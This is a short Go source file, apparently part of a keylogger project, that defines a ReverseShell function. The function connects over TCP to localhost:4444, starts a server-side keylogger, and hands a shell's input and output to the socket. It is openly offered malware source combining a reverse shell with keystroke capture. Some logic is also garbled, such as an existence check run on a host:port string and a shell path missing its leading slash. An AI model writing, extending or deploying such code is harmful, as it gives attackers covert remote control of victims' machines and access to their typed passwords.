package rs

import (
	"fmt"
	"net"
	"os"
	"os/exec"

	"github.com/gabrielfnayres/keylogger_go/server"
)

var connectionStr string = "localhost:4444"

const buffSize = 128

func VerifyIfExists(connectionStr string) bool {
	_, err := os.Stat(connectionStr)
	if err != nil {
		fmt.Println(err)
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}

func ReverseShell() {
	if !VerifyIfExists(connectionStr) {
		os.Exit(1)
	}
	// simple connection
	conn, err := net.Dial("tcp", connectionStr)
	if err != nil {
		os.Exit(1)
	}
	server.ServerSideKeylogger()
	cmd := exec.Command("bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()

}
